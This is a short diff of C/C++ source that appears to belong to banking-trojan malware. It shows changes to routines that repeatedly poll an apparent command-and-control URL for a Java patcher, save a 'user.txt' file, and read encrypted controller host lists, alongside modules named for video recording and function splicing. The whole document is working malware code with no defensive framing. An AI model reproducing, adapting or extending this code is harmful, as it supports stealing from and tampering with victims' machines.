@@ -13,7 +13,6 @@
 #include "ntdll.h"
 #include "Utils.h"
 #include "Modules.h"
-#include "JavaConfig.h"
 #include "Richedit.h"
 #include "VideoRecorder.h"
 #include "Splice.h"
@@ -148,23 +147,18 @@ const char* GetJREPath()
 
 static char* GetJavaPatcherURL( char* url )
 {
-	PCHAR URL = NULL;
+    *url = 0;
+	string URL;
 	do
 	{
-		#ifdef JavaConfigH
-			URL = GetJavaScriptURL(0);//JavaPatcherURLPath);
-		#else
-			URL = GetBotScriptURL(0, 0);//JavaPatcherURLPath);
-		#endif
-		if (URL == NULL)
+		URL = GetAzURL(NULL);
+		if (URL.IsEmpty())
         	pSleep(60000);
 	}
-	while(URL == NULL);
+	while(URL.IsEmpty());
 
-	if( URL )
-		m_lstrcpy( url, URL );
-	else
-		url[0] = 0;
+	m_lstrcpy( url, URL.t_str());
+
 	return url;
 }
 
@@ -607,11 +601,11 @@ static bool DownloadAndSave( const char* baseUrl, char* rtAddFilePath, char* ini
 	pPathAppendA( fileName, "user.txt" );
 	File::WriteBufferA( fileName, azUser.t_str(), azUser.Length() );
 
-#ifdef RafaH
+#ifdef AzConfigH
 	//сохраняем домены
 	char* mem = (char*)HEAP::Alloc(1024);
 	*mem = 0;
-	TStrEnum E( Rafa::Hosts(), RAFAHOSTS_PARAM_ENCRYPTED, 0x86D19DC3 /* __RAFA_HOSTS__ */ );
+	TStrEnum E(GetAzHostsBuf(), AZCONFIG_PARAM_ENCRYPTED_HOSTS, 0);
 	
 	while( E.Next() )
 	{
